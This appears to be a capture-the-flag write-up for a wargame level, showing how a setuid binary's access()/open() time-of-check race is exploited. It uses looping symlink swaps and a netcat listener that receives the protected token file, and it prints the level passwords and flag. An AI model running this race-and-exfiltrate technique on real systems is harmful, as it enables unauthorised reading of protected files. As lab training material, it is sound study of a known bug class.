# Level 10

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level10@192.168.1.32
	Password: s5cAJpM8ev6XHw998pRWG728z
	```

1. Check files.

	```sh
	> ls -l
	total 16
	-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
	-rw-------  1 flag10 flag10     26 Mar  5  2016 token
	```

1. Oh Sh*t, here we go again.

	```sh
	> ./level10
	./level10 file host
	sends file to host if you have access to it

	> cat token
	cat: token: Permission denied

	> ./level10 token 127.0.0.1
	You don't have access to token

	> FILE=/tmp/exploit10; echo "exploitme" > $FILE && ./level10 $FILE 127.0.0.1
	Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
	```

1. Daily routine, done. We now have few informations. The required listening port seems to be 6969. What about override it ?

	```sh
	> FILE=/tmp/exploit10; echo "exploitme" > $FILE && ./level10 $FILE 127.0.0.1:3000
	Connecting to 127.0.0.1:3000:6969 .. Unable to connect to host 127.0.0.1:3000
	```

1. Ok, strange behaviour here. Let's do a `strings` check.

	```sh
	> strings level10
	...
	socket
	fflush
	exit
	htons
	connect
	puts
	...
	printf
	...
	read
	...
	open
	access
	strerror
	...
	write
	...
	%s file host
		sends file to host if you have access to it
	Connecting to %s:6969 ..
	Unable to connect to host %s
	.*( )*.
	Unable to write banner to host %s
	Connected!
	Sending file ..
	Damn. Unable to open file
	Unable to read from file: %s
	wrote file!
	You don't have access to %s
	...
	```

1. Ok, the port is just hardcoded in the string `Connecting to %s:6969 ..`. Let's setup a quick `netcat` listener.

	```sh
	# -l : Listen ; -k Keep listening after first connection completed
	> nc -lk 6969

	# In another terminal
	> FILE=/tmp/exploit10; echo "exploitme" > $FILE && ./level10 $FILE 127.0.0.1
	Connecting to 127.0.0.1:6969 .. Connected!
	Sending file .. wrote file!
	```

1. Amazing, we have our basic functionnality. Now we need to find a way to pass our `token` file. Maybe like on previous level, using a `symlink` ?

	```sh
	> LINK=/tmp/link10; ln -sf $PWD/token $LINK; ./level10 $LINK 127.0.0.1
	You don't have access to /tmp/link10

	> ls -l $LINK
	lrwxrwxrwx 1 level10 level10 24 Aug 28 14:39 /tmp/link10 -> /home/user/level10/token
	```

1. Sadly, doesn't work. Go back to our `strings` result. Trying to find another vulnerability.

	```
	...
	- `socket` - Create an endpoint for communication
	- `fflush` - Flush a stream
	- `exit` - Cause normal process termination
	- `htons` - Convert values between host and network byte order
	- `connect` - Initiate a connection on a socket
	- `puts` - Output of characters and strings
	...
	- `printf` - @see level08
	...
	- `read` - @see level08
	...
	- `open` - @see level08
	- `access` - Check user's permissions for a file
	- `strerror` -
	...
	- `write` - @see level08
	...
	```

1. Well, the function's definition, our first target here would be `access`. Let's see what the documentation has to say.

	```
	NOTES

	Warning: Using these calls to check if a user is authorized to,
	for example, open a file before actually doing so using open(2)
	creates a security hole, because the user might exploit the short
	time interval between checking and opening the file to manipulate
	it.  For this reason, the use of this system call should be
	avoided.
	...

	access() always dereferences symbolic links.
	...
	```

1. What a lucky day, it's exactly what we are looking for!

	```sh
	# Terminal 1
	> nc -lk 6969

	# Terminal 2
	> while true; do FILE="/tmp/link10"; rm -f $FILE; touch $FILE; rm -f $FILE; ln -sf $PWD/token $FILE; done

	# Terminal 3
	> while true; do FILE="/tmp/link10"; ./level10 $FILE 127.0.0.1 > /dev/null 2>&1; done
	```

1. After few seconds, our `nc` should have printed the `token`.

	```
	...
	.*( )*.
	woupa2yuojeeaaed06riuj63c
	.*( )*.
	...
	```

1. Get the flag.

	```sh
	> su flag10
	Password: woupa2yuojeeaaed06riuj63c
	Don't forget to launch getflag !

	> getflag
	Check flag.Here is your token : feulo4b72j7edeahuete3no7c
	```

## Documentation

- Function: [socket](https://man7.org/linux/man-pages/man2/socket.2.html)
- Function: [fflush](https://man7.org/linux/man-pages/man3/fflush.3.html)
- Function: [exit](https://man7.org/linux/man-pages/man3/exit.3.html)
- Function: [htons](https://man7.org/linux/man-pages/man3/ntohs.3.html)
- Function: [connect](https://man7.org/linux/man-pages/man2/connect.2.html)
- Function: [puts](https://man7.org/linux/man-pages/man3/puts.3.html)
- Function: [access](https://man7.org/linux/man-pages/man2/access.2.html)
- Function: [strerror](https://man7.org/linux/man-pages/man3/strerror.3.html)
- Command: [nc](https://linux.die.net/man/1/nc)
